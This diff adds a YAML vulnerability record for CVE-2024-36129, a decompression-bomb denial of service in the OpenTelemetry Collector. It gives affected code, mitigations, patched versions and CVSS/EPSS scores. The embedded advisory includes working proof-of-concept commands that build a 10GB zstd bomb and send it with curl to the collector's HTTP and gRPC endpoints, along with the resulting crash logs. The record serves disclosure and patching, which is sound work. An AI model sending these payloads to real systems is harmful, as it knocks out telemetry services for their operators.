@@ -1,0 +1,424 @@
+vulnerability_id: VCID-hay3-7asm-aaaf
+aliases:
+  - CVE-2024-36129
+  - GHSA-c74f-6mfw-mm4v
+summary: "Denial of Service via Zip/Decompression Bomb sent over HTTP or gRPC\n### Summary\n\
+  An unsafe decompression vulnerability allows unauthenticated attackers to crash the collector\
+  \ via excessive memory consumption.\n\n### Details\nThe OpenTelemetry Collector handles compressed\
+  \ HTTP requests by recognizing the Content-Encoding header, rewriting the HTTP request body,\
+  \ and allowing subsequent handlers to process decompressed data. It supports the gzip, zstd,\
+  \ zlib, snappy, and deflate compression algorithms. A \"zip bomb\" or \"decompression bomb\"\
+  \ is a malicious archive designed to crash or disable the system reading it. Decompression\
+  \ of HTTP requests is typically not enabled by default in popular server solutions due to\
+  \ associated security risks. A malicious attacker could leverage this weakness to crash the\
+  \ collector by sending a small request that, when uncompressed by the server, results in excessive\
+  \ memory consumption.\n\nDuring proof-of-concept (PoC) testing, all supported compression\
+  \ algorithms could be abused, with zstd causing the most significant impact. Compressing 10GB\
+  \ of all-zero data reduced it to 329KB. Sending an HTTP request with this compressed data\
+  \ instantly consumed all available server memory (the testing server had 32GB), leading to\
+  \ an out-of-memory (OOM) kill of the collector application instance.\n\nThe root cause for\
+  \ this issue can be found in the following code path:\n\n**Affected File:**\n[https://github.com/open-telemetry/opentelemetry-collector/[...]confighttp/compression.go](https://github.com/open-telemetry/opentelemetry-collector/blob/062d0a7ffcd45831f993d21d1c6fb67d3e74b5e2/config/confighttp/compression.go)\
+  \ \n\n**Affected Code:**\n```\n// httpContentDecompressor offloads the task of handling compressed\
+  \ HTTP requests\n// by identifying the compression format in the \"Content-Encoding\" header\
+  \ and re-writing\n// request body so that the handlers further in the chain can work on decompressed\
+  \ data.\n// It supports gzip and deflate/zlib compression.\nfunc httpContentDecompressor(h\
+  \ http.Handler, eh func(w http.ResponseWriter, r *http.Request, errorMsg string, statusCode\
+  \ int), decoders map[string]func(body io.ReadCloser) (io.ReadCloser, error)) http.Handler\
+  \ {\n    [...]\n    d := &decompressor{\n        errHandler: errHandler,\n        base:  \
+  \ \th,\n        decoders: map[string]func(body io.ReadCloser) (io.ReadCloser, error){\n  \
+  \          \"\": func(io.ReadCloser) (io.ReadCloser, error) {\n                // Not a compressed\
+  \ payload. Nothing to do.\n                return nil, nil\n            },\n            [...]\n\
+  \            \"zstd\": func(body io.ReadCloser) (io.ReadCloser, error) {\n               \
+  \ zr, err := zstd.NewReader(\n                    body,\n                    zstd.WithDecoderConcurrency(1),\n\
+  \                )\n                if err != nil {\n                    return nil, err\n\
+  \                }\n                return zr.IOReadCloser(), nil\n            },\n    [...]\n\
+  }\n\nfunc (d *decompressor) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n    newBody,\
+  \ err := d.newBodyReader(r)\n    if err != nil {\n        d.errHandler(w, r, err.Error(),\
+  \ http.StatusBadRequest)\n        return\n    }\n    [...]\n    d.base.ServeHTTP(w, r)\n}\n\
+  \nfunc (d *decompressor) newBodyReader(r *http.Request) (io.ReadCloser, error) {\n    encoding\
+  \ := r.Header.Get(headerContentEncoding)\n    decoder, ok := d.decoders[encoding]\n    if\
+  \ !ok {\n        return nil, fmt.Errorf(\"unsupported %s: %s\", headerContentEncoding, encoding)\n\
+  \    }\n    return decoder(r.Body)\n}\n```\n\nTo mitigate this attack vector, it is recommended\
+  \ to either disable support for decompressing client HTTP requests entirely or limit the size\
+  \ of the decompressed data that can be processed. Limiting the decompressed data size can\
+  \ be achieved by wrapping the decompressed data reader inside an io.LimitedReader, which restricts\
+  \ the reading to a specified number of bytes. This approach helps prevent excessive memory\
+  \ usage and potential out-of-memory errors caused by decompression bombs.\n\n### PoC\nThis\
+  \ issue was confirmed as follows:\n\n**PoC Commands:**\n```\ndd if=/dev/zero bs=1G count=10\
+  \ | zstd > poc.zst\ncurl -vv \"http://192.168.0.107:4318/v1/traces\" -H \"Content-Type: application/x-protobuf\"\
+  \ -H \"Content-Encoding: zstd\" --data-binary @poc.zst\n```\n\n**Output:**\n```\n10+0 records\
+  \ in\n10+0 records out\n10737418240 bytes (11 GB, 10 GiB) copied, 12,207 s, 880 MB/s\n\n*\
+  \ processing: http://192.168.0.107:4318/v1/traces\n*   Trying 192.168.0.107:4318...\n* Connected\
+  \ to 192.168.0.107 (192.168.0.107) port 4318\n> POST /v1/traces HTTP/1.1\n> Host: 192.168.0.107:4318\n\
+  > User-Agent: curl/8.2.1\n> Accept: */*\n> Content-Type: application/x-protobuf\n> Content-Encoding:\
+  \ zstd\n> Content-Length: 336655\n>\n* We are completely uploaded and fine\n* Recv failure:\
+  \ Connection reset by peer\n* Closing connection\ncurl: (56) Recv failure: Connection reset\
+  \ by peer\n```\n\n**Server logs:**\n```\notel-collector-1  | 2024-05-30T18:36:14.376Z    info\
+  \    service@v0.101.0/service.go:102    Setting up own telemetry...\n[...]\notel-collector-1\
+  \  | 2024-05-30T18:36:14.385Z    info    otlpreceiver@v0.101.0/otlp.go:152    Starting HTTP\
+  \ server    {\"kind\": \"receiver\", \"name\": \"otlp\", \"data_type\": \"traces\", \"endpoint\"\
+  : \"0.0.0.0:4318\"}\notel-collector-1  | 2024-05-30T18:36:14.385Z    info    service@v0.101.0/service.go:195\
+  \    Everything is ready. Begin running and processing data.\notel-collector-1  | 2024-05-30T18:36:14.385Z\
+  \    warn    localhostgate/featuregate.go:63    The default endpoints for all servers in components\
+  \ will change to use localhost instead of 0.0.0.0 in a future version. Use the feature gate\
+  \ to preview the new default.    {\"feature gate ID\": \"component.UseLocalHostAsDefaultHost\"\
+  }\notel-collector-1 exited with code 137\n```\n\nA similar problem exists for configgrpc when\
+  \ using the zstd compression:\n\n```\ndd if=/dev/zero bs=1G count=10 | zstd > poc.zst\npython3\
+  \ -c 'import os, struct; f = open(\"/tmp/body.raw\", \"w+b\"); f.write(b\"\\x01\"); f.write(struct.pack(\"\
+  >L\", os.path.getsize(\"poc.zst\"))); f.write(open(\"poc.zst\", \"rb\").read())'\ncurl -vv\
+  \ http://127.0.0.1:4317/opentelemetry.proto.collector.trace.v1.TraceService/Export --http2-prior-knowledge\
+  \ -H \"content-type: application/grpc\" -H \"grpc-encoding: zstd\" --data-binary @/tmp/body.raw\n\
+  ```\n\n### Impact\nUnauthenticated attackers can crash the collector via excessive memory\
+  \ consumption, stopping the entire collection of telemetry.\n\n### Patches\n- The confighttp\
+  \ module version 0.102.0 contains a fix for this problem.\n- The configgrpc module version\
+  \ 0.102.1 contains a fix for this problem.\n- All official OTel Collector distributions starting\
+  \ with v0.102.1 contain both fixes.\n\n### Workarounds\n- None.\n\n### References\n- https://github.com/open-telemetry/opentelemetry-collector/pull/10289\n\
+  - https://github.com/open-telemetry/opentelemetry-collector/pull/10323\n- https://opentelemetry.io/blog/2024/cve-2024-36129/\n\
+  \n### Credits\nThis issue was uncovered during a security audit performed by 7ASecurity, facilitated\
+  \ by OSTIF, for the OpenTelemetry project."
+severities:
+  - score: '8.2'
+    scoring_system: cvssv3
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H
+    published_at: None
+    url: https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2024-36129.json
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.28558'
+    published_at: '2025-01-16 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.28134'
+    published_at: '2024-12-27 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.28162'
+    published_at: '2024-12-19 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.28170'
+    published_at: '2024-12-17 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.28238'
+    published_at: '2024-12-15 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.28150'
+    published_at: '2024-12-13 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.28082'
+    published_at: '2024-12-11 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.27847'
+    published_at: '2024-12-03 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.27803'
+    published_at: '2024-11-28 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.27791'
+    published_at: '2024-11-26 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.27782'
+    published_at: '2024-11-24 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.27794'
+    published_at: '2024-11-23 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.27738'
+    published_at: '2024-11-21 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.27363'
+    published_at: '2024-11-01 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.27710'
+    published_at: '2024-11-20 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00062'
+    scoring_system: epss
+    scoring_elements: '0.27636'
+    published_at: '2024-11-18 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00706'
+    scoring_system: epss
+    scoring_elements: '0.70892'
+    published_at: '2025-04-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00706'
+    scoring_system: epss
+    scoring_elements: '0.70834'
+    published_at: '2025-04-15 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00706'
+    scoring_system: epss
+    scoring_elements: '0.70858'
+    published_at: '2025-04-16 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00706'
+    scoring_system: epss
+    scoring_elements: '0.70888'
+    published_at: '2025-04-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00706'
+    scoring_system: epss
+    scoring_elements: '0.70907'
+    published_at: '2025-04-27 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00706'
+    scoring_system: epss
+    scoring_elements: '0.70911'
+    published_at: '2025-04-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00706'
+    scoring_system: epss
+    scoring_elements: '0.70889'
+    published_at: '2025-04-20 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00706'
+    scoring_system: epss
+    scoring_elements: '0.70883'
+    published_at: '2025-04-21 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00706'
+    scoring_system: epss
+    scoring_elements: '0.70898'
+    published_at: '2025-04-22 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00706'
+    scoring_system: epss
+    scoring_elements: '0.70897'
+    published_at: '2025-04-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00706'
+    scoring_system: epss
+    scoring_elements: '0.70901'
+    published_at: '2025-04-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.00706'
+    scoring_system: epss
+    scoring_elements: '0.70909'
+    published_at: '2025-04-26 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.01611'
+    scoring_system: epss
+    scoring_elements: '0.80092'
+    published_at: '2025-03-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.01611'
+    scoring_system: epss
+    scoring_elements: '0.80086'
+    published_at: '2025-03-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.02527'
+    scoring_system: epss
+    scoring_elements: '0.84143'
+    published_at: '2025-04-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.02527'
+    scoring_system: epss
+    scoring_elements: '0.84137'
+    published_at: '2025-04-10 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.02527'
+    scoring_system: epss
+    scoring_elements: '0.84153'
+    published_at: '2025-04-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.02527'
+    scoring_system: epss
+    scoring_elements: '0.84139'
+    published_at: '2025-04-12 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.02527'
+    scoring_system: epss
+    scoring_elements: '0.84138'
+    published_at: '2025-04-14 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.02527'
+    scoring_system: epss
+    scoring_elements: '0.84091'
+    published_at: '2025-04-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.02527'
+    scoring_system: epss
+    scoring_elements: '0.84087'
+    published_at: '2025-04-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.02527'
+    scoring_system: epss
+    scoring_elements: '0.84112'
+    published_at: '2025-04-04 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.02527'
+    scoring_system: epss
+    scoring_elements: '0.84117'
+    published_at: '2025-04-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.02527'
+    scoring_system: epss
+    scoring_elements: '0.84109'
+    published_at: '2025-04-06 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.02527'
+    scoring_system: epss
+    scoring_elements: '0.84111'
+    published_at: '2025-04-07 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.02527'
+    scoring_system: epss
+    scoring_elements: '0.84128'
+    published_at: '2025-04-09 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '0.05554'
+    scoring_system: epss
+    scoring_elements: '0.83391'
+    published_at: '2025-03-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+  - score: '8.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H
+    published_at: None
+    url: https://github.com/open-telemetry/opentelemetry-collector
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/open-telemetry/opentelemetry-collector
+  - score: '8.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H
+    published_at: None
+    url: https://github.com/open-telemetry/opentelemetry-collector/pull/10289
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/open-telemetry/opentelemetry-collector/pull/10289
+  - score: '8.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H
+    published_at: None
+    url: https://github.com/open-telemetry/opentelemetry-collector/pull/10323
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/open-telemetry/opentelemetry-collector/pull/10323
+  - score: '8.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H
+    published_at: None
+    url: https://github.com/open-telemetry/opentelemetry-collector/security/advisories/GHSA-c74f-6mfw-mm4v
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/open-telemetry/opentelemetry-collector/security/advisories/GHSA-c74f-6mfw-mm4v
+  - score: '7.5'
+    scoring_system: cvssv3
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-36129
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-36129
+  - score: '8.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-36129
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-36129
+  - score: '8.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H
+    published_at: None
+    url: https://opentelemetry.io/blog/2024/cve-2024-36129
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://opentelemetry.io/blog/2024/cve-2024-36129
+  - score: '8.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H
+    published_at: None
+    url: https://pkg.go.dev/vuln/GO-2024-2900
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://pkg.go.dev/vuln/GO-2024-2900
+weaknesses:
+  - CWE-119
+references:
+  - url: https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2024-36129.json
+    reference_type:
+    reference_id:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-36129
+    reference_type:
+    reference_id:
+  - url: https://github.com/open-telemetry/opentelemetry-collector
+    reference_type:
+    reference_id:
+  - url: https://github.com/open-telemetry/opentelemetry-collector/pull/10289
+    reference_type:
+    reference_id:
+  - url: https://github.com/open-telemetry/opentelemetry-collector/pull/10323
+    reference_type:
+    reference_id:
+  - url: https://github.com/open-telemetry/opentelemetry-collector/security/advisories/GHSA-c74f-6mfw-mm4v
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-36129
+    reference_type:
+    reference_id:
+  - url: https://opentelemetry.io/blog/2024/cve-2024-36129
+    reference_type:
+    reference_id:
+  - url: https://pkg.go.dev/vuln/GO-2024-2900
+    reference_type:
+    reference_id:
+  - url: https://bugzilla.redhat.com/show_bug.cgi?id=2291337
+    reference_type:
+    reference_id: 2291337
+  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:opentelemetry:configgrpc:*:*:*:*:*:go:*:*
+    reference_type:
+    reference_id: cpe:2.3:a:opentelemetry:configgrpc:*:*:*:*:*:go:*:*
+  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:opentelemetry:confighttp:*:*:*:*:*:go:*:*
+    reference_type:
+    reference_id: cpe:2.3:a:opentelemetry:confighttp:*:*:*:*:*:go:*:*
+  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:opentelemetry:opentelemetry_collector:*:*:*:*:*:*:*:*
+    reference_type:
+    reference_id: cpe:2.3:a:opentelemetry:opentelemetry_collector:*:*:*:*:*:*:*:*
+  - url: https://access.redhat.com/errata/RHSA-2024:3943
+    reference_type:
+    reference_id: RHSA-2024:3943
